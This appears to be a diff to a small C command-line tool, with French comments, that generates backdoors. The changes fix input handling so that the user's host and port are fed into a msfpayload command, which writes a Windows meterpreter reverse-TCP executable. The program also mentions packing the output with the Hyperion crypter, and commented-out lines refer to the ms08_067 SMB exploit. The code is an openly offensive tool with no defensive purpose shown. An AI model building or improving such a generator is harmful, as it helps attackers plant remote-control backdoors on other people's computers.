@@ -15,6 +15,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdlib.h>
+#include <string.h>
 #define couleur(param) printf("\033[$m",param)
 void set_color_to(int color){ //mettre la couleur à un nombre 
 	switch(color){
@@ -43,7 +44,7 @@ void reintialise_color(){ //remet la couleur par default
 
 	printf("\033[0m");
 }
-void message_info(char the_message[]){		//message de chargement
+void message_info(char const the_message[]){		//message de chargement
 	printf("[");
 	set_color_to(34);
 	printf("Info");
@@ -65,11 +66,11 @@ void ok(){//message ok
 	reintialise_color();
 	printf("] : ");
 }
-void message_done(char the_message[]){	   	//message chargement fait
+void message_done(char const the_message[]){	   	//message chargement fait
 	ok();
 	printf("%s .\n",the_message);
 }
-void message_error(char the_message[]){		//messsage d'erreur
+void message_error(char const the_message[]){		//messsage d'erreur
 	printf("[");
 	set_color_to(31);
 	printf("ERROR");
@@ -92,7 +93,7 @@ void creating_bin(){
 	return ;
 
 }
-void encrypt_his_shit(const char * name_of_bam){
+void encrypt_his_shit(const char name_of_bam[]){
 	/*
 
 		using Hyperion 
@@ -114,10 +115,11 @@ void encrypt_his_shit(const char * name_of_bam){
 
 }
 void start(){
-	const char * host;
-	const char * path;
-	const char * name;
-	int port;
+	char host[100];
+	char path[100];
+	char name[100];
+	char long_cmd[200]="msfpayload windows/meterpreter/reverse_tcp LHOST=";
+	char port[10];
 	char yb;
 	message_info("Starting ..");
 	//system("msfconsole");
@@ -125,18 +127,25 @@ void start(){
 	//system("use windows/smb/ms08_067_netapi");
 	message_info("Host ?");
 	write();
-	scanf("%s",&host);
+	scanf("%s",host);
 	message_info("port ?");
 	write();
-	scanf("%d",&port);
+	scanf("%s",port);
 	message_info("Path ?");
 	write();
-	scanf("%s",&path);
+	scanf("%s",path);
 	message_info("backdoor name?");
 	write();
-	scanf("%s",&path);
+	scanf("%s",path);
 	message_info("Creating...");
+	/*
 	char long_cmd[200] = "msfpayload windows/meterpreter/reverse_tcp LHOST=10.188.70.74 LPORT=444 x > /home/naper/bam.exe";
+	*/
+	strcat(long_cmd, host);
+	strcat(long_cmd, " LPORT=");
+	strcat(long_cmd, port);
+	strcat(long_cmd, " x > ");
+	strcat(long_cmd, path);
 	system(long_cmd);
 	message_done("backdoor generated");
 	message_info("Would you like to creat a .bin file ?(y/n)");
@@ -149,10 +158,9 @@ void start(){
 	scanf(" %c",&yb);
 	if (yb == 'y')
 		encrypt_his_shit(name);
-
-
-
+	/*
 	exit(1);
+	*/
 	return ;
 }
 void arguments(int argc, const char * cmd){
@@ -196,10 +204,9 @@ void header(){
 
 	return ;
 }
-void main(int argc, char ** argv){
+int main(int argc, char ** argv){
 	const char * cmd = argv[1];
 	header();
 	arguments(argc, cmd);
-	return ;
+	return 0;
 }
-
